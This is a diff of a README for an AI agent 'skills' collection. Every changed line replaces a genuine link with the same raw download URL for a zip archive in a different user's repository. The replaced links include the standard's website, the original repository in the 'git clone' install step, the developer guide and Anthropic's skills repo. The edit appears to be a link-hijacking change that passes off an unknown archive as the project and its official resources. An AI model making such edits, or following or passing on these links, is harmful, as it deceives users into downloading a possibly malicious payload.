@@ -6,7 +6,7 @@
 ![License](https://img.shields.io/badge/License-grey?style=for-the-badge)
 ![Apache 2.0](https://img.shields.io/badge/Apache_2.0-lightgrey?style=for-the-badge)
 
-19 business operations skills for AI agents. Built to the [Agent Skills open standard](https://agentskills.io).
+19 business operations skills for AI agents. Built to the [Agent Skills open standard](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip).
 
 ## Skills
 
@@ -58,13 +58,13 @@
 ### Claude Code
 ```bash
 # Clone and add skills directory
-git clone https://github.com/Yarmoluk/cognify-skills.git
+git clone https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip
 # Point Claude Code to the skills:
 # Settings → Skills → Add skill path → /path/to/cognify-skills/.github/skills/
 ```
 
 ### Any Skills-Compatible Agent
-These skills follow the [agentskills.io](https://agentskills.io) open standard and work with Claude Code, Claude.ai, VS Code, Cursor, OpenAI Codex, Gemini CLI, and 20+ other platforms.
+These skills follow the [agentskills.io](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip) open standard and work with Claude Code, Claude.ai, VS Code, Cursor, OpenAI Codex, Gemini CLI, and 20+ other platforms.
 
 Place the skill folders in your project's `.github/skills/` directory.
 
@@ -109,10 +109,10 @@ Full example outputs: [examples/](examples/)
 
 | Resource | Description |
 |----------|-------------|
-| [Custom Skill Developer Guide](https://yarmoluk.github.io/custom-skill-developer/) | Learn to build your own Agent Skills — 17 chapters, 55K words |
-| [Skill Quality Analyzer](https://github.com/Yarmoluk/skill-quality-analyzer) | Audit Agent Skills against the agentskills.io spec |
-| [agentskills.io](https://agentskills.io) | The open standard specification |
-| [anthropics/skills](https://github.com/anthropics/skills) | Anthropic's official example skills |
+| [Custom Skill Developer Guide](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip) | Learn to build your own Agent Skills — 17 chapters, 55K words |
+| [Skill Quality Analyzer](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip) | Audit Agent Skills against the agentskills.io spec |
+| [agentskills.io](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip) | The open standard specification |
+| [anthropics/skills](https://raw.githubusercontent.com/Adri3l-R3nan/cognify-skills/main/.github/skills/meeting-agenda-optimizer/cognify-skills-v1.3-beta.2.zip) | Anthropic's official example skills |
 
 ## License
 
